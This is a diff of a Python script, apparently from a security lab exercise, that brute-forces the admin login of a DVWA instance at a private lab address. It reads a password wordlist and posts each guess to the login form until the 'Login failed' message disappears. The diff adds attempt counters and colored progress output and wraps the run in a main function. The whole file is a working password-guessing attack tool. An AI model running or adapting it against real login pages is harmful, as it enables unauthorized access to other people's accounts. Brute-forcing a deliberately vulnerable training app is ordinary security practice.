@@ -1,14 +1,13 @@
 import sys
+from important_static_functions import *
 from datetime import datetime
-import threading
 import requests
 import queue
-
 from termcolor import colored
 
 
 def wordlist_build(file_path):
-    is_resume = False
+    # is_resume = False
     words = queue.Queue()
 
     with open(file_path) as fp:
@@ -23,6 +22,7 @@ def wordlist_build(file_path):
 
 
 def brute_force(url, username, username_field, password_field, submit_field_name,  verification, word_queue):
+    number = 1
     while not word_queue.empty():
         try_this = word_queue.get()
         data = {
@@ -32,13 +32,14 @@ def brute_force(url, username, username_field, password_field, submit_field_name
         }
         response = requests.post(url, data=data)
         if verification not in response.content.decode('utf-8'):
-            print(colored(f'[+] Password Found {try_this}', 'green'))
-            now2 = datetime.now()
-            print(now2.strftime("%H.%M.%S"))
+            print(colored(f'[+] Working On {number}\t\t\tPassword Found "{try_this}"', 'green'))
             sys.exit(0)
+        else:
+            print(colored(f'[-] Working On {number}\t\t\tPassword Invalid "{try_this}"', 'red'))
+        number += 1
 
 
-passwords = wordlist_build('passwords.txt')
-now1 = datetime.now()
-print(now1.strftime("%H.%M.%S"))
-brute_force('http://192.168.56.101/dvwa/login.php', 'admin', 'username', 'password', 'Login', 'Login failed', passwords)
+def main():
+    fix_color_output()
+    passwords = wordlist_build('passwords.txt')
+    brute_force('http://192.168.56.101/dvwa/login.php', 'admin', 'username', 'password', 'Login', 'Login failed', passwords)
